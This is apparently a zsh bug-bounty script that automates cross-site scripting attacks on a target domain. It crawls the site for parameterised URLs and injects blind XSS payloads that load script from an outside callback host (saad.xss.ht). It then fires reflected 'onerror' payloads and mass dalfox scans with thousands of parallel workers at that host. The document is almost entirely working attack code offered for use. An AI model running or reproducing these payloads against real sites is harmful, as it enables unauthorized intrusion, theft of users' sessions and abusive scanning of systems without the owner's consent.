#!/bin/zsh

#TARGET=$1

echo -e "Start xss v1 blind \n"

gospider -S $1 -t 200 -c 700 | tr " " "\n" | grep --color=auto -v ".js" | grep --color=auto "https://" | grep --color=auto "=" | qsreplace '"><script src=https://saad.xss.ht></script>'

echo -e "Start xss v2 \n"

sigurlfind3r -d $1 -iS -s -f ".(jpg|jpeg|gif|png|ico|css|eot|tif|tiff|ttf|woff|woff2)" | anew -q way_output
#------------------------------------------------#
cat way_output.txt | urldedupe -s | anew -q parameters.txt
#------------------------------------------------#
echo -e "[+] Start gf xss [+]"
#------------------------------------------------#
cat parameters.txt | gf xss | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | qsreplace "FUZZ" | anew -q xssPatterns.txt
#------------------------------------------------#
cat xssPatterns.txt | qsreplace "\"><img src=x onerror=confirm(document.domain)>" | xargs -P 5000 -I % bash -c "curl -s -L '%' | grep \"<img src=x onerror=confirm(document.domain)>\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q xss.txt &> /dev/null
#------------------------------------------------#
dalfox file xssPatterns.txt pipe --silence --no-color --no-spinner --mass --mass-worker 5000 --skip-bav -w 1000 -b saad.xss.ht 2> /dev/null | anew -q xss.txt &> /dev/null

echo -e "[+] Start Blinder [+]"

python3 Blinder.py -u saad -f parameters.txt -r deny

rm xssPatterns.txt
